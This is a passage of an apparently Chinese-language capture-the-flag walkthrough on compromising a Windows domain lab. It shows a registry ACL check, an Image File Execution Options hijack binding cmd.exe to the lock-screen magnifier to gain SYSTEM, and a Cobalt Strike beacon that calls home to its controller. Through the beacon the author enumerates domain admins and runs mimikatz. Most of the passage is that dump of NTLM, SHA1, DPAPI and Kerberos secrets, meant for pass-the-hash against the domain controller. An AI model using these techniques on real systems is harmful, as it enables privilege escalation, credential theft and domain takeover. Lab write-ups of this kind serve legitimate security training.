+</span></span><span class=line><span class=cl>                          NT AUTHORITY<span class=se>\A</span>uthenticated Users Allow  SetValue, CreateSubKey, ReadKey
+</span></span><span class=line><span class=cl>                          NT AUTHORITY<span class=se>\S</span>YSTEM Allow  FullControl
+</span></span><span class=line><span class=cl>                          BUILTIN<span class=se>\A</span>dministrators Allow  FullControl
+</span></span><span class=line><span class=cl>                          BUILTIN<span class=se>\U</span>sers Allow  ReadKey
+</span></span><span class=line><span class=cl>                          APPLICATION PACKAGE AUTHORITY<span class=se>\A</span>LL APPLICATION PACKAGES Allow  ReadKey
+</span></span><span class=line><span class=cl>AuditToString           :
+</span></span><span class=line><span class=cl>AccessRightType         : System.Security.AccessControl.RegistryRights
+</span></span><span class=line><span class=cl>AccessRuleType          : System.Security.AccessControl.RegistryAccessRule
+</span></span><span class=line><span class=cl>AuditRuleType           : System.Security.AccessControl.RegistryAuditRule
+</span></span><span class=line><span class=cl>AreAccessRulesProtected : True
+</span></span><span class=line><span class=cl>AreAuditRulesProtected  : False
+</span></span><span class=line><span class=cl>AreAccessRulesCanonical : True
+</span></span><span class=line><span class=cl>AreAuditRulesCanonical  : True
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>AccessToString          : CREATOR OWNER Allow  FullControl
+</span></span><span class=line><span class=cl>                          NT AUTHORITY<span class=se>\A</span>uthenticated Users Allow  SetValue, CreateSubKey, ReadKey
+</span></span><span class=line><span class=cl>                          NT AUTHORITY<span class=se>\S</span>YSTEM Allow  FullControl
+</span></span></code></pre></div><p>注意到这里有一个在这个用户组下允许设置值，创建值和阅读值<br>即Authenticated Users<br>而这里大佬给出了解释</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Authenticated Users 的成员
+</span></span><span class=line><span class=cl>包括：
+</span></span><span class=line><span class=cl>所有域用户（Domain Users）。
+</span></span><span class=line><span class=cl>所有本地用户（Local Users）。
+</span></span><span class=line><span class=cl>所有通过身份验证的计算机账户（Computer Accounts）。
+</span></span><span class=line><span class=cl>不包括：
+</span></span><span class=line><span class=cl>匿名用户（Anonymous）。
+</span></span><span class=line><span class=cl>Guest 账户（除非启用了 Guest 账户并进行了身份验证）。
+</span></span></code></pre></div><p>所以我们拥有这些权限，可以进行放大镜提权<br>通过修改注册表，把cmd.exe绑定到放大镜那里(注意这里的cmd.exe)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\A</span>ldrich&gt; REG ADD <span class=s2>&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&#34;</span> /v Debugger /t REG_SZ /d <span class=s2>&#34;C:\windows\system32\cmd.exe&#34;</span>
+</span></span><span class=line><span class=cl>操作成功完成。
+</span></span></code></pre></div><p>注意!我们还需要上线cs(beacon复制粘贴进目标机器即可)</p><p>对了，在这里有小可爱会发问了，都rdp连接上去了，为什么我们不能直接在用户端的cmd中直接运行我们的cs后门来上线cs，而偏偏要通过放大镜绑定cmd之后，锁定用户退到登录界面进行上线cs呢?</p><p>在这里我自己尝试过，你登录进去之后上线cs，只拿到了用户权限<br>而通过放大镜提取，再上线cs，你会得到system权限</p><p>然后锁定用户之后推出到系统登录页面，点击右下角的放大镜<br><img class=article-content-image src=/image/Tsclient10.png loading=lazy decoding=async alt="alt text"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11/01 18:45:30<span class=o>]</span> beacon&gt; shell <span class=nb>type</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag<span class=se>\f</span>lag02.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:45:30<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run: <span class=nb>type</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag<span class=se>\f</span>lag02.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:45:31<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>74</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:45:31<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl>   . .    .       . .       . .       .      .       . .       . .       . .    .    
+</span></span><span class=line><span class=cl>.+<span class=s1>&#39;|=|`+.=|`+. .+&#39;</span><span class=p>|</span><span class=o>=</span><span class=p>|</span><span class=sb>`</span>+. .+<span class=s1>&#39;|=|`+. .+&#39;</span><span class=p>|</span>      <span class=p>|</span><span class=sb>`</span>+. .+<span class=s1>&#39;|=|`+. .+&#39;</span><span class=p>|</span><span class=o>=</span><span class=p>|</span><span class=sb>`</span>+. .+<span class=s1>&#39;|=|`+.=|`+. 
+</span></span></span><span class=line><span class=cl><span class=s1>|.+&#39;</span> <span class=p>|</span>  <span class=p>|</span> <span class=sb>`</span>+.<span class=p>|</span> <span class=p>|</span>  <span class=p>|</span> <span class=sb>`</span>+.<span class=p>|</span> <span class=p>|</span>  <span class=p>|</span> <span class=sb>`</span>+.<span class=p>|</span> <span class=p>|</span>  <span class=p>|</span>      <span class=p>|</span>  <span class=p>|</span> <span class=p>|</span>  <span class=p>|</span> <span class=sb>`</span>+.<span class=p>|</span> <span class=p>|</span>  <span class=p>|</span> <span class=sb>`</span>+ <span class=p>|</span> <span class=p>|</span>.+<span class=s1>&#39; |  | `+.| 
+</span></span></span><span class=line><span class=cl><span class=s1>     |  |      |  | .    |  |      |  |      |  | |  |=|`.  |  |  | |      |  |      
+</span></span></span><span class=line><span class=cl><span class=s1>     |  |      `+.|=|`+. |  |      |  |      |  | |  | `.|  |  |  | |      |  |      
+</span></span></span><span class=line><span class=cl><span class=s1>     |  |      .    |  | |  |    . |  |    . |  | |  |    . |  |  | |      |  |      
+</span></span></span><span class=line><span class=cl><span class=s1>     |  |      |`+. |  | |  | .+&#39;</span><span class=p>|</span> <span class=p>|</span>  <span class=p>|</span> .+<span class=s1>&#39;| |  | |  | .+&#39;</span><span class=p>|</span> <span class=p>|</span>  <span class=p>|</span>  <span class=p>|</span> <span class=p>|</span>      <span class=p>|</span>  <span class=p>|</span>      
+</span></span><span class=line><span class=cl>     <span class=p>|</span>.+<span class=s1>&#39;      `+.|=|.+&#39;</span> <span class=sb>`</span>+.<span class=p>|</span><span class=o>=</span><span class=p>|</span>.+<span class=s1>&#39; `+.|=|.+&#39;</span> <span class=p>|</span>.+<span class=s1>&#39; `+.|=|.+&#39;</span> <span class=sb>`</span>+.<span class=p>|</span>  <span class=p>|</span>.<span class=p>|</span>      <span class=p>|</span>.+<span class=err>&#39;</span>      
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag02: flag<span class=o>{</span>b06699e2-856b-4f94-8c87-4fee27c3bf47<span class=o>}</span>
+</span></span></code></pre></div><p>拿到flag2</p><h2 id=flag3>flag3</h2><p>查看当前的域管理员</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11/01 18:46:53<span class=o>]</span> beacon&gt; shell net group <span class=s2>&#34;domain admins&#34;</span> /domain
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:46:53<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run: net group <span class=s2>&#34;domain admins&#34;</span> /domain
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:46:54<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>64</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:46:54<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl>这项请求将在域 xiaorang.lab 的域控制器处理。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>组名     Domain Admins
+</span></span><span class=line><span class=cl>注释     指定的域管理员
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>成员
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------
+</span></span><span class=line><span class=cl>Administrator            WIN2016$                 
+</span></span><span class=line><span class=cl>命令成功完成。
+</span></span></code></pre></div><p>发现我们拿flag2的这台机器就是域内管理员<br>那我们需要抓取这个管理员的hash。用这机器的hash连接到域控上</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11/01 18:48:54<span class=o>]</span> beacon&gt; logonpasswords
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:48:54<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run mimikatz<span class=err>&#39;</span>s sekurlsa::logonpasswords <span class=nb>command</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:48:54<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>297480</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:48:55<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>114</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 18:48:55<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>24663096</span> <span class=o>(</span>00000000:01785438<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>2</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-2
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 18:22:30
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-2
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * NTLM     : 217850c87ae3a76d998d8c85ad02e0dc
+</span></span><span class=line><span class=cl>	 * SHA1     : bfdd1f04aec108e73f0b86ba1174d4ca878b755e
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>	 * Password : f9 e6 1d d5 <span class=m>24</span> 6d <span class=m>09</span> e8 0a 2f <span class=m>09</span> <span class=m>43</span> b2 b2 0d d1 c6 a9 c4 a1 <span class=m>43</span> 8e d0 e6 f2 3a <span class=m>63</span> 6c c6 <span class=m>73</span> <span class=m>71</span> <span class=m>39</span> cc a4 <span class=m>34</span> 0e 6d <span class=m>60</span> e5 5d <span class=m>30</span> 6f <span class=m>37</span> 9e <span class=m>56</span> f9 <span class=m>73</span> b6 <span class=m>12</span> <span class=m>02</span> da a8 0c <span class=m>54</span> 5b <span class=m>44</span> <span class=m>58</span> 7d b1 3c 1b b5 e6 <span class=m>30</span> 9d 1e f6 6a ff c4 d1 ff <span class=m>53</span> e0 <span class=m>30</span> 5d c2 6e <span class=nb>fc</span> bf 6b a3 <span class=m>99</span> <span class=m>72</span> a2 4c 9a a8 <span class=m>73</span> 9f <span class=m>03</span> <span class=m>03</span> 6e 2a f2 <span class=m>64</span> <span class=m>22</span> <span class=m>05</span> a6 ea d5 d8 e9 <span class=m>25</span> 3b <span class=m>55</span> 7c 4e 5e <span class=m>64</span> cb bb <span class=m>84</span> <span class=m>62</span> a6 d9 7a ba <span class=m>64</span> db c7 b6 <span class=m>72</span> <span class=m>82</span> <span class=m>98</span> 8b <span class=m>90</span> <span class=m>56</span> 8e <span class=m>79</span> ca <span class=m>82</span> <span class=m>82</span> <span class=m>79</span> a9 fa ef 4c dd <span class=m>28</span> ef eb 2c e8 <span class=nb>fc</span> <span class=m>12</span> f0 <span class=m>27</span> <span class=m>64</span> <span class=m>09</span> <span class=m>69</span> b1 <span class=m>25</span> bc bf e2 b8 <span class=m>05</span> ac <span class=m>70</span> 2d a0 fe <span class=m>85</span> 0e <span class=m>31</span> b1 e3 <span class=m>09</span> <span class=m>89</span> 9b 4c b2 b9 <span class=m>63</span> <span class=m>57</span> c4 <span class=m>15</span> 9b <span class=m>68</span> <span class=m>34</span> a0 <span class=m>48</span> 3d 9d <span class=m>68</span> f7 c8 <span class=m>91</span> a7 0f b1 d5 <span class=m>39</span> <span class=m>28</span> da <span class=m>26</span> <span class=m>68</span> a1 5c 4c 4b c1 af a0 a7 <span class=m>25</span> <span class=m>15</span> 9f e6 9f <span class=nb>fc</span> b0 <span class=m>63</span> e7 8d 2d be <span class=m>35</span> 3a 2e 5b <span class=m>33</span> 2b <span class=m>19</span> <span class=m>16</span> <span class=m>18</span> <span class=m>40</span> bc <span class=m>70</span> <span class=m>30</span> d4 5b fa <span class=m>81</span> fa <span class=m>42</span> <span class=m>01</span> <span class=m>69</span> <span class=m>36</span> 
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>996</span> <span class=o>(</span>00000000:000003e4<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Service from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : WIN2016$
+</span></span><span class=line><span class=cl>Domain            : XIAORANG
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 15:31:05
+</span></span><span class=line><span class=cl>SID               : S-1-5-20
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * NTLM     : 217850c87ae3a76d998d8c85ad02e0dc
+</span></span><span class=line><span class=cl>	 * SHA1     : bfdd1f04aec108e73f0b86ba1174d4ca878b755e
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : win2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG.LAB
+</span></span><span class=line><span class=cl>	 * Password : f9 e6 1d d5 <span class=m>24</span> 6d <span class=m>09</span> e8 0a 2f <span class=m>09</span> <span class=m>43</span> b2 b2 0d d1 c6 a9 c4 a1 <span class=m>43</span> 8e d0 e6 f2 3a <span class=m>63</span> 6c c6 <span class=m>73</span> <span class=m>71</span> <span class=m>39</span> cc a4 <span class=m>34</span> 0e 6d <span class=m>60</span> e5 5d <span class=m>30</span> 6f <span class=m>37</span> 9e <span class=m>56</span> f9 <span class=m>73</span> b6 <span class=m>12</span> <span class=m>02</span> da a8 0c <span class=m>54</span> 5b <span class=m>44</span> <span class=m>58</span> 7d b1 3c 1b b5 e6 <span class=m>30</span> 9d 1e f6 6a ff c4 d1 ff <span class=m>53</span> e0 <span class=m>30</span> 5d c2 6e <span class=nb>fc</span> bf 6b a3 <span class=m>99</span> <span class=m>72</span> a2 4c 9a a8 <span class=m>73</span> 9f <span class=m>03</span> <span class=m>03</span> 6e 2a f2 <span class=m>64</span> <span class=m>22</span> <span class=m>05</span> a6 ea d5 d8 e9 <span class=m>25</span> 3b <span class=m>55</span> 7c 4e 5e <span class=m>64</span> cb bb <span class=m>84</span> <span class=m>62</span> a6 d9 7a ba <span class=m>64</span> db c7 b6 <span class=m>72</span> <span class=m>82</span> <span class=m>98</span> 8b <span class=m>90</span> <span class=m>56</span> 8e <span class=m>79</span> ca <span class=m>82</span> <span class=m>82</span> <span class=m>79</span> a9 fa ef 4c dd <span class=m>28</span> ef eb 2c e8 <span class=nb>fc</span> <span class=m>12</span> f0 <span class=m>27</span> <span class=m>64</span> <span class=m>09</span> <span class=m>69</span> b1 <span class=m>25</span> bc bf e2 b8 <span class=m>05</span> ac <span class=m>70</span> 2d a0 fe <span class=m>85</span> 0e <span class=m>31</span> b1 e3 <span class=m>09</span> <span class=m>89</span> 9b 4c b2 b9 <span class=m>63</span> <span class=m>57</span> c4 <span class=m>15</span> 9b <span class=m>68</span> <span class=m>34</span> a0 <span class=m>48</span> 3d 9d <span class=m>68</span> f7 c8 <span class=m>91</span> a7 0f b1 d5 <span class=m>39</span> <span class=m>28</span> da <span class=m>26</span> <span class=m>68</span> a1 5c 4c 4b c1 af a0 a7 <span class=m>25</span> <span class=m>15</span> 9f e6 9f <span class=nb>fc</span> b0 <span class=m>63</span> e7 8d 2d be <span class=m>35</span> 3a 2e 5b <span class=m>33</span> 2b <span class=m>19</span> <span class=m>16</span> <span class=m>18</span> <span class=m>40</span> bc <span class=m>70</span> <span class=m>30</span> d4 5b fa <span class=m>81</span> fa <span class=m>42</span> <span class=m>01</span> <span class=m>69</span> <span class=m>36</span> 
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>24686203</span> <span class=o>(</span>00000000:0178ae7b<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : RemoteInteractive from <span class=m>2</span>
+</span></span><span class=line><span class=cl>User Name         : Aldrich
+</span></span><span class=line><span class=cl>Domain            : XIAORANG
+</span></span><span class=line><span class=cl>Logon Server      : DC01
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 18:22:31
+</span></span><span class=line><span class=cl>SID               : S-1-5-21-3289074908-3315245560-3429321632-1105
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>	 * Username : Aldrich
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * NTLM     : 35baccd9e3aef26ca2457cebe0f3fb17
+</span></span><span class=line><span class=cl>	 * SHA1     : 16b45b7ca7397dc25f7d12080104c6d31d5999cc
+</span></span><span class=line><span class=cl>	 * DPAPI    : e3e9811841bdf2bd91d303d9b6c45aea
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : Aldrich
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : Aldrich
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG.LAB
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>24663123</span> <span class=o>(</span>00000000:01785453<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>2</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-2
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 18:22:30
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-2
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * NTLM     : 217850c87ae3a76d998d8c85ad02e0dc
+</span></span><span class=line><span class=cl>	 * SHA1     : bfdd1f04aec108e73f0b86ba1174d4ca878b755e
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>	 * Password : f9 e6 1d d5 <span class=m>24</span> 6d <span class=m>09</span> e8 0a 2f <span class=m>09</span> <span class=m>43</span> b2 b2 0d d1 c6 a9 c4 a1 <span class=m>43</span> 8e d0 e6 f2 3a <span class=m>63</span> 6c c6 <span class=m>73</span> <span class=m>71</span> <span class=m>39</span> cc a4 <span class=m>34</span> 0e 6d <span class=m>60</span> e5 5d <span class=m>30</span> 6f <span class=m>37</span> 9e <span class=m>56</span> f9 <span class=m>73</span> b6 <span class=m>12</span> <span class=m>02</span> da a8 0c <span class=m>54</span> 5b <span class=m>44</span> <span class=m>58</span> 7d b1 3c 1b b5 e6 <span class=m>30</span> 9d 1e f6 6a ff c4 d1 ff <span class=m>53</span> e0 <span class=m>30</span> 5d c2 6e <span class=nb>fc</span> bf 6b a3 <span class=m>99</span> <span class=m>72</span> a2 4c 9a a8 <span class=m>73</span> 9f <span class=m>03</span> <span class=m>03</span> 6e 2a f2 <span class=m>64</span> <span class=m>22</span> <span class=m>05</span> a6 ea d5 d8 e9 <span class=m>25</span> 3b <span class=m>55</span> 7c 4e 5e <span class=m>64</span> cb bb <span class=m>84</span> <span class=m>62</span> a6 d9 7a ba <span class=m>64</span> db c7 b6 <span class=m>72</span> <span class=m>82</span> <span class=m>98</span> 8b <span class=m>90</span> <span class=m>56</span> 8e <span class=m>79</span> ca <span class=m>82</span> <span class=m>82</span> <span class=m>79</span> a9 fa ef 4c dd <span class=m>28</span> ef eb 2c e8 <span class=nb>fc</span> <span class=m>12</span> f0 <span class=m>27</span> <span class=m>64</span> <span class=m>09</span> <span class=m>69</span> b1 <span class=m>25</span> bc bf e2 b8 <span class=m>05</span> ac <span class=m>70</span> 2d a0 fe <span class=m>85</span> 0e <span class=m>31</span> b1 e3 <span class=m>09</span> <span class=m>89</span> 9b 4c b2 b9 <span class=m>63</span> <span class=m>57</span> c4 <span class=m>15</span> 9b <span class=m>68</span> <span class=m>34</span> a0 <span class=m>48</span> 3d 9d <span class=m>68</span> f7 c8 <span class=m>91</span> a7 0f b1 d5 <span class=m>39</span> <span class=m>28</span> da <span class=m>26</span> <span class=m>68</span> a1 5c 4c 4b c1 af a0 a7 <span class=m>25</span> <span class=m>15</span> 9f e6 9f <span class=nb>fc</span> b0 <span class=m>63</span> e7 8d 2d be <span class=m>35</span> 3a 2e 5b <span class=m>33</span> 2b <span class=m>19</span> <span class=m>16</span> <span class=m>18</span> <span class=m>40</span> bc <span class=m>70</span> <span class=m>30</span> d4 5b fa <span class=m>81</span> fa <span class=m>42</span> <span class=m>01</span> <span class=m>69</span> <span class=m>36</span> 
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>17705683</span> <span class=o>(</span>00000000:010e2ad3<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Service from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : DefaultAppPool
+</span></span><span class=line><span class=cl>Domain            : IIS APPPOOL
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 17:02:10
+</span></span><span class=line><span class=cl>SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * NTLM     : 217850c87ae3a76d998d8c85ad02e0dc
+</span></span><span class=line><span class=cl>	 * SHA1     : bfdd1f04aec108e73f0b86ba1174d4ca878b755e
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>	 * Password : f9 e6 1d d5 <span class=m>24</span> 6d <span class=m>09</span> e8 0a 2f <span class=m>09</span> <span class=m>43</span> b2 b2 0d d1 c6 a9 c4 a1 <span class=m>43</span> 8e d0 e6 f2 3a <span class=m>63</span> 6c c6 <span class=m>73</span> <span class=m>71</span> <span class=m>39</span> cc a4 <span class=m>34</span> 0e 6d <span class=m>60</span> e5 5d <span class=m>30</span> 6f <span class=m>37</span> 9e <span class=m>56</span> f9 <span class=m>73</span> b6 <span class=m>12</span> <span class=m>02</span> da a8 0c <span class=m>54</span> 5b <span class=m>44</span> <span class=m>58</span> 7d b1 3c 1b b5 e6 <span class=m>30</span> 9d 1e f6 6a ff c4 d1 ff <span class=m>53</span> e0 <span class=m>30</span> 5d c2 6e <span class=nb>fc</span> bf 6b a3 <span class=m>99</span> <span class=m>72</span> a2 4c 9a a8 <span class=m>73</span> 9f <span class=m>03</span> <span class=m>03</span> 6e 2a f2 <span class=m>64</span> <span class=m>22</span> <span class=m>05</span> a6 ea d5 d8 e9 <span class=m>25</span> 3b <span class=m>55</span> 7c 4e 5e <span class=m>64</span> cb bb <span class=m>84</span> <span class=m>62</span> a6 d9 7a ba <span class=m>64</span> db c7 b6 <span class=m>72</span> <span class=m>82</span> <span class=m>98</span> 8b <span class=m>90</span> <span class=m>56</span> 8e <span class=m>79</span> ca <span class=m>82</span> <span class=m>82</span> <span class=m>79</span> a9 fa ef 4c dd <span class=m>28</span> ef eb 2c e8 <span class=nb>fc</span> <span class=m>12</span> f0 <span class=m>27</span> <span class=m>64</span> <span class=m>09</span> <span class=m>69</span> b1 <span class=m>25</span> bc bf e2 b8 <span class=m>05</span> ac <span class=m>70</span> 2d a0 fe <span class=m>85</span> 0e <span class=m>31</span> b1 e3 <span class=m>09</span> <span class=m>89</span> 9b 4c b2 b9 <span class=m>63</span> <span class=m>57</span> c4 <span class=m>15</span> 9b <span class=m>68</span> <span class=m>34</span> a0 <span class=m>48</span> 3d 9d <span class=m>68</span> f7 c8 <span class=m>91</span> a7 0f b1 d5 <span class=m>39</span> <span class=m>28</span> da <span class=m>26</span> <span class=m>68</span> a1 5c 4c 4b c1 af a0 a7 <span class=m>25</span> <span class=m>15</span> 9f e6 9f <span class=nb>fc</span> b0 <span class=m>63</span> e7 8d 2d be <span class=m>35</span> 3a 2e 5b <span class=m>33</span> 2b <span class=m>19</span> <span class=m>16</span> <span class=m>18</span> <span class=m>40</span> bc <span class=m>70</span> <span class=m>30</span> d4 5b fa <span class=m>81</span> fa <span class=m>42</span> <span class=m>01</span> <span class=m>69</span> <span class=m>36</span> 
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>995</span> <span class=o>(</span>00000000:000003e3<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Service from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : IUSR
+</span></span><span class=line><span class=cl>Domain            : NT AUTHORITY
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 15:31:09
+</span></span><span class=line><span class=cl>SID               : S-1-5-17
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	 * Domain   : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
